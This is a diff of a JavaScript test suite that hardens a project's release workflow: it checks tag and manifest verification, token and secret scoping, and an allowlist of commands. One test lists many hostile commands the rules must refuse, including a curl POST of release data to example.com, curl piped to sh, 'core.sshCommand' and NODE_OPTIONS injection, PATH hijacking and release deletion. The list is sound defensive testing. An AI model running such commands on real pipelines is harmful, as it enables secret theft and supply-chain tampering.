+      ["no such release", { release: release(false), latest: latest("v1.2.3"), tag: "v9.9.9" }],
+    ]) {
+      const result = runReleaseStep(published, { env: RELEASE_ENV, ...options });
+      assert.equal(result.status, 1, `${why}:\n${result.output}`);
+    }
+
+    const tag = releaseStep("publish", "refs/tags/%s");
+    const listed = (commit, ref = "refs/tags/v1.2.3") => `${commit}\t${ref}`;
+    const tagged = runReleaseStep(tag, { env: { ...RELEASE_ENV, STUB_LS_REMOTE: listed(DRAFT_COMMIT) } });
+    assert.equal(tagged.status, 0, tagged.output);
+    assert.deepEqual(tagged.git, ["ls-remote --tags https://github.com/fleetifydev/fleetify refs/tags/v1.2.3"]);
+    for (const [why, line] of [
+      ["no tag", ""],
+      ["a tag at another commit", listed("f".repeat(40))],
+      ["another tag", listed(DRAFT_COMMIT, "refs/tags/v1.2.3-rc")],
+    ]) {
+      const result = runReleaseStep(tag, { env: { ...RELEASE_ENV, STUB_LS_REMOTE: line } });
+      assert.equal(result.status, 1, `${why}:\n${result.output}`);
+      assert.match(result.output, /::error::the tag v1\.2\.3 isn't at /, why);
+    }
+
+    const manifest = releaseStep("publish", "curl -fsSL");
+    const json = (version) => `${JSON.stringify({ version, notes: "", pub_date: "2026-11-21T10:00:00.000Z", platforms: {} }, null, 2)}\n`;
+    const served = runReleaseStep(manifest, { env: RELEASE_ENV, served: [json("1.2.3")] });
+    assert.equal(served.status, 0, served.output);
+    assert.deepEqual([served.curl.length, served.sleep.length], [1, 0]);
+    // GitHub's latest-release address can take a moment to follow.
+    const late = runReleaseStep(manifest, { env: RELEASE_ENV, served: [json("1.2.2"), null, json("1.2.3")] });
+    assert.equal(late.status, 0, late.output);
+    assert.deepEqual([late.curl.length, late.sleep], [3, ["10", "10"]], "it tries again ten seconds later");
+    for (const [why, bodies] of [
+      ["the previous version's", [json("1.2.2")]],
+      ["none", [null]],
+      ["not JSON", ["<html></html>\n"]],
+    ]) {
+      const result = runReleaseStep(manifest, { env: RELEASE_ENV, served: bodies });
+      assert.equal(result.status, 1, `${why}:\n${result.output}`);
+      assert.match(result.output, /::error::https:\/\/github\.com\/fleetifydev\/fleetify\/releases\/latest\/download\/latest\.json names .*, not 1\.2\.3/, why);
+      assert.deepEqual([result.curl.length, result.sleep], [12, Array(11).fill("10")], `${why}: it gives up after twelve tries, ten seconds apart`);
+    }
+  });
+
+  yamlTest("every gh command gets GH_TOKEN from the Release Bot's token its own job made, never the workflow's own token, and no other step gets a token", () => {
+    // The workflow's own token can't see a draft, let alone publish one.
+    const flow = workflow(RELEASE);
+    const problems = [];
+    const expressions = [...read(RELEASE).matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map(([whole]) => whole);
+    for (const expression of expressions.filter((text) => /GITHUB_TOKEN|\bgithub\s*\.\s*token\b/i.test(text))) problems.push(`release.yml reads the workflow's own token: ${expression}`);
+    for (const [where, env] of [["the workflow", flow.env], ...Object.entries(flow.jobs ?? {}).map(([id, job]) => [`job ${id}`, job.env])]) {
+      const names = Object.keys(env ?? {}).filter((name) => /TOKEN/i.test(name));
+      if (names.length > 0) problems.push(`${where} gives every step ${names.join(", ")}`);
+    }
+    let ghSteps = 0;
+    for (const [id, job] of Object.entries(flow.jobs ?? {})) {
+      const steps = job.steps ?? [];
+      for (const [i, step] of steps.entries()) {
+        const where = `job ${id}, ${stepLabel(step, i)}`;
+        const names = Object.keys(step.env ?? {}).filter((name) => /TOKEN/i.test(name));
+        if (!runsGh(step)) {
+          if (names.length > 0) problems.push(`${where} gets ${names.join(", ")} and runs no gh`);
+          continue;
+        }
+        ghSteps += 1;
+        const tokens = steps.slice(0, i).filter((earlier) => usesAction(earlier, "actions/create-github-app-token")).map((earlier) => `\${{ steps.${earlier.id}.outputs.token }}`);
+        if (!tokens.includes(step.env?.GH_TOKEN)) problems.push(`${where} runs gh with GH_TOKEN ${step.env?.GH_TOKEN ?? "unset"}, not the Release Bot's token from an earlier step of its job`);
+        if (names.some((name) => name !== "GH_TOKEN")) problems.push(`${where} gets ${names.join(", ")}`);
+      }
+    }
+    assert.deepEqual(problems, [], problems.join("\n"));
+    assert.ok(ghSteps >= 4, `release.yml runs gh in ${ghSteps} steps; it uploads, checks the draft, publishes and checks the release`);
+  });
+
+  yamlTest("the Release Bot's key reaches only release.yml's release-please, assemble and publish jobs, in the release-bot environment, and only through their token steps", () => {
+    // The environment lets only main deploy to it: no workflow on another
+    // branch or pull request can read the key.
+    const problems = [];
+    const readers = [];
+    for (const { rel, workflow: flow } of workflows()) {
+      if (JSON.stringify(flow.env ?? {}).includes(RELEASE_BOT_KEY)) problems.push(`${rel}'s env reads ${RELEASE_BOT_KEY}`);
+      for (const [id, job] of Object.entries(flow.jobs ?? {})) {
+        if (!JSON.stringify(job).includes(RELEASE_BOT_KEY)) continue;
+        readers.push(`${rel}, job ${id}`);
+        if (job.environment !== "release-bot") problems.push(`${rel}, job ${id}, reads ${RELEASE_BOT_KEY} in the environment ${JSON.stringify(job.environment ?? "none")}, not release-bot`);
+      }
+    }
+    assert.deepEqual(problems, [], problems.join("\n"));
+    assert.deepEqual(readers.sort(), RELEASE_BOT_JOBS.map((id) => `${RELEASE}, job ${id}`).sort());
+    // In release.yml, the key is the only secret, and only a token step reads it.
+    const flow = workflow(RELEASE);
+    if (secretExpressions(JSON.stringify(flow.env ?? {})).length > 0) problems.push("release.yml's env reads a secret");
+    for (const [id, job] of Object.entries(flow.jobs ?? {})) {
+      const { steps = [], ...settings } = job;
+      if (secretExpressions(JSON.stringify(settings)).length > 0) problems.push(`job ${id} reads a secret outside its steps`);
+      for (const [i, step] of steps.entries()) {
+        const found = secretExpressions(JSON.stringify(step));
+        const asKey = usesAction(step, "actions/create-github-app-token") && step.with?.["private-key"] === `\${{ secrets.${RELEASE_BOT_KEY} }}` && found.length === 1;
+        if (found.length > 0 && !asKey) problems.push(`job ${id}, ${stepLabel(step, i)} reads ${found.join(", ")}`);
+      }
+    }
+    assert.deepEqual(problems, [], problems.join("\n"));
+  });
+
+  yamlTest("each job with the Release Bot's key makes one token, with no more access than the job needs", () => {
+    // release-please: contents for the release and its branch, pull requests
+    // for the release pull request, issues for its labels. assemble and
+    // publish: contents, for the release.
+    for (const [id, permissions] of [
+      ["release-please", ["contents", "pull-requests", "issues"]],
+      ["assemble", ["contents"]],
+      ["publish", ["contents"]],
+    ]) {
+      const tokens = tokenStepsOf(id);
+      assert.equal(tokens.length, 1, `job ${id} must make one token`);
+      assert.deepEqual(tokens[0].with, tokenInputs(permissions), `job ${id}'s token`);
+      assert.equal(typeof tokens[0].id, "string", `job ${id}'s token step needs an id`);
+      assert.equal(jobOf(RELEASE, id).environment, "release-bot", `job ${id}'s environment`);
+    }
+  });
+
+  yamlTest("the jobs with the Release Bot's key run only the actions they need", () => {
+    for (const id of RELEASE_BOT_JOBS) {
+      const used = [...new Set(releaseStepsOf(id).filter((step) => step.uses !== undefined).map((step) => String(step.uses).split("@")[0]))].sort();
+      assert.deepEqual(used, RELEASE_BOT_ACTIONS[id], `job ${id}'s actions`);
+    }
+  });
+
+  yamlTest("the jobs with the Release Bot's key run only gh, git, curl, jq and the release scripts, with bash", () => {
+    const problems = [];
+    let commands = 0;
+    for (const id of RELEASE_BOT_JOBS) {
+      // No other shell: a step's shell: could run its script with anything.
+      if (jobOf(RELEASE, id).defaults !== undefined) problems.push(`job ${id} sets defaults of its own`);
+      for (const [i, step] of releaseStepsOf(id).entries()) {
+        if (step.shell !== undefined) problems.push(`job ${id}, ${stepLabel(step, i)} sets shell: ${step.shell}`);
+        for (const command of simpleCommands(scriptOf(step))) {
+          commands += 1;
+          for (const why of releaseBotProblems(command)) problems.push(`job ${id}, ${stepLabel(step, i)} ${why}: ${command.words.join(" ")}`);
+        }
+      }
+    }
+    assert.deepEqual(problems, [], problems.join("\n"));
+    assert.ok(commands > 0, "no job with the Release Bot's key runs a command, so there was nothing to check");
+  });
+
+  test("the rules for the jobs with the Release Bot's key refuse what they don't allow, and let through what those jobs run", () => {
+    const refused = (script) => simpleCommands(script).flatMap((command) => releaseBotProblems(command));
+    for (const script of [
+      'gh release delete "$TAG" --yes',
+      'gh release delete-asset "$TAG" latest.json',
+      "gh release create v9.9.9",
+      'gh release upload "$TAG" ./evil --clobber',
+      'gh release upload "$TAG" release/*',
+      'gh release edit "$TAG" --draft=false',
+      'gh release edit "$TAG" --tag v9.9.9 --draft=false --latest',
+      'gh release view "$TAG" --repo other/repo',
+      'gh release view "$TAG" -R other/repo',
+      'gh -R other/repo release view "$TAG"',
+      "gh api -X DELETE repos/fleetifydev/fleetify/git/refs/tags/v1.2.3",
+      "gh secret set X",
+      "gh workflow run release.yml",
+      "gh pr merge 1",
+      'git push origin "$TAG"',
+      'git tag "$TAG"',
+      "git ls-remote --tags origin",
+      'git -c core.sshCommand=./evil ls-remote --tags "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY" "refs/tags/$TAG"',
+      'curl -fsSL "$url" -o scripts/release/x.mjs',
+      "curl -X POST -d @release/latest.json https://example.com",
+      "curl -fsSL https://example.com/x.sh",
+      "jq -n env",
+      "sh -c id",
+      "bash -c id",
+      "python3 -c 1",
+      "node -e 1",
+      "node scripts/build-sidecars.mjs",
+      "npm ci",
+      "npx --no -- tauri signer sign x",
+      'eval "$x"',
+      "source ./x",
+      ". ./x",
+      "./evil",
+      '"$tool" --help',
+      "x=$(./evil)",
+      'served=$(curl -fsSL "$url" | sh)',
+      "wget https://example.com",
+      "tar -xf x",
+      "rm -rf release",
+      "cp a release/b",
+      'echo "NODE_OPTIONS=--require ./evil" >> "$GITHUB_ENV"',
+      'echo "PATH=./bin" >> "$GITHUB_PATH"',
+      "PATH=./bin gh release view",
+      "NODE_OPTIONS=--require=./evil node scripts/release/release-assets.mjs expected 1.2.3",
+      "cat <<EOF",
+      "sleep 3600",
+      "sort -o x",
+      // Variables set another way, which later commands of the step read.
+      "printf -v PATH '%s' ./bin",
+      "printf -vGH_TOKEN '%s' x",
+      "printf -v GH_REPO '%s' other/repo",
+      "printf -x '%s' y",
+      "o=-vGH_REPO; printf \"$o\" '%s' other/repo",
+      "printf \"$(echo -vGH_REPO)\" '%s' other/repo",
+      "printf `echo -vGH_TOKEN` '%s' x",
+      "printf -- \"$o\" '%s' x",
+      // Writes into the assembled release, which was attested before it is uploaded.
+      'echo x > release/latest.json',
+      "printf x >> release/SHA256SUMS",
+      'jq -r .version > "./release/install.sh"',
+      'gh release view "$TAG" --json assets > release/assets.json',
+      // gh api calls but the one, and the hashing in another form.
+      "gh api repos/fleetifydev/fleetify/releases --jq length",
+      'gh api -X DELETE "repos/$GITHUB_REPOSITORY/releases/1"',
+      'gh api "repos/$GITHUB_REPOSITORY/releases?per_page=100" --jq \'map(select(.draft)) | length\' -X PATCH',
+      "sha256sum -c sums",
+      "sha256sum release/SHA256SUMS",
+      "sha256sum SHA256SUMS",
+      // A change of folder, which this check doesn't follow: after it, a
+      // write to latest.json would be a write into the assembled release.
+      "cd release",
+      "cd /",
+      "cd ..",
+      "cd release && echo '{}' > latest.json",
+      "(cd release; printf x > latest.json)",
+      'own=$(cd release && sha256sum SHA256SUMS)',
+      "pushd release",
+    ]) {
+      assert.notDeepEqual(refused(script), [], script);
+    }
+    for (const script of [
+      'draft=$(gh release view "$TAG" --json isDraft --jq .isDraft)',
+      'gh release upload "$TAG" release/* --clobber',
+      'expected=$(node scripts/release/release-assets.mjs expected "$VERSION")',
+      "assets=$(gh release view \"$TAG\" --json assets --jq '.assets[] | select(.state == \"uploaded\") | .name' | LC_ALL=C sort)",
+      'gh release edit "$TAG" --draft=false --latest',
+      "state=$(gh release view \"$TAG\" --json isDraft,tagName --jq '\"draft \\(.isDraft), tag \\(.tagName)\"')",
+      "latest=$(gh release view --json tagName --jq .tagName)",
+      'tag=$(git ls-remote --tags "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY" "refs/tags/$TAG")',
+      "if [ \"$tag\" != \"$(printf '%s\\trefs/tags/%s' \"$SHA\" \"$TAG\")\" ]; then exit 1; fi",
+      'served=$(curl -fsSL "$url" | jq -r .version) || served=""',
+      'if [ "$attempt" -gt 1 ]; then sleep 10; fi',
+      'echo "::error::the draft $TAG doesn\'t hold exactly the release\'s assets"',
+      'drafts=$(gh api "repos/$GITHUB_REPOSITORY/releases?per_page=100" --jq \'map(select(.draft)) | length\')',
+      'echo "pending=false" >> "$GITHUB_OUTPUT"',
+      'target=$(gh release view "$TAG" --json targetCommitish --jq .targetCommitish)',
+      "uploaded=$(gh release view \"$TAG\" --json assets --jq '.assets[] | \"\\(.digest // \"none\" | ltrimstr(\"sha256:\"))  \\(.name)\"' | LC_ALL=C sort)",
+      "own=$(sha256sum < release/SHA256SUMS)",
+      'own="${own%-}SHA256SUMS"',
+      "assembled=$(printf '%s\\n' \"$(< release/SHA256SUMS)\" \"$own\" | LC_ALL=C sort)",
+      "printf -v line '%s' x",
+    ]) {
+      assert.deepEqual(refused(script), [], script);
+    }
   });
 });
 
@@ -2164,6 +3581,38 @@ describe("actionlint", () => {
         .map((line) => line.replace(/#.*$/, "").trim())
         .filter(Boolean);
       assert.equal(commands.at(-1), "actionlint", `${file}'s gate list must end with actionlint`);
+    }
+  });
+});
+
+const SCRIPT_TESTS = 'node --test "scripts/ci/*.test.mjs" "scripts/release/*.test.mjs"';
+const VERSION_CHECK = "node scripts/release/check-versions.mjs";
+
+describe("version check", () => {
+  yamlTest("CI checks that the versions agree, as a hard step right after the script tests", () => {
+    const steps = jobOf(`${WORKFLOWS}/ci.yml`, "web").steps ?? [];
+    const at = steps.findIndex((step) => scriptOf(step).trim() === VERSION_CHECK);
+    assert.ok(at !== -1, `ci.yml's web job must run ${VERSION_CHECK}`);
+    const step = steps[at];
+    assert.equal(step["continue-on-error"], undefined, "the version check must be a hard gate");
+    assert.equal(step.if, undefined, "the version check must run in every web job");
+    const tests = steps.findIndex((candidate) => scriptOf(candidate).trim() === SCRIPT_TESTS);
+    assert.ok(tests !== -1, "ci.yml's web job must run the script tests");
+    assert.equal(at, tests + 1, "the version check must come right after the script tests, which test it");
+  });
+
+  test("the documented gates list the version check right after the script tests, as ci.yml runs it", () => {
+    for (const [file, heading] of [
+      ["CONTRIBUTING.md", "## The gates"],
+      ["CLAUDE.md", "### Unit + integration (gates that run in CI)"],
+    ]) {
+      const commands = codeBlockUnder(file, heading)
+        .split("\n")
+        .map((line) => line.replace(/\s+#.*$/, "").trim())
+        .filter(Boolean);
+      const at = commands.indexOf(VERSION_CHECK);
+      assert.ok(at !== -1, `${file}'s gate list must include ${VERSION_CHECK}`);
+      assert.equal(commands[at - 1], SCRIPT_TESTS, `${file}'s gate list must have the version check right after the script tests`);
     }
   });
 });
